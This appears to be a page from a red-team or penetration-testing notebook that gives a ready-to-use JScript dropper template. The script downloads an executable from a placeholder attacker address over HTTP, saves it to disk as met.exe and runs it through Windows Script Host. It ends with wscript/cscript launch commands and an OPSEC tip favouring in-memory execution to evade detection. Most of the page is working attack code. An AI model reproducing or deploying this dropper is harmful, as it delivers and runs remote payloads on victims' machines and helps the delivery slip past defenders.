## JScript Dropper

Downloads and executes a payload using ActiveX objects. Runs via `wscript.exe` or `cscript.exe`.

---

### JScript Dropper Template

```javascript
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.open('GET', 'http://<ATTACKER_IP>/shell.exe', false);
Object.send();

if (Object.Status == 200) {
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Type = 1; // Binary
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile("met.exe", 2); // adSaveCreateOverWrite
    Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

> **OPSEC:** This drops to disk. Prefer in-memory execution where possible.

---

### Execution

```sh
# Execute JScript file
wscript.exe payload.js
cscript.exe payload.js

# Execute VBScript file
wscript.exe payload.vbs
cscript.exe payload.vbs
```

---

> See also: [[2. Weaponisation & Delivery/HTA Chains]], [[2. Weaponisation & Delivery/Malicious Documents]]
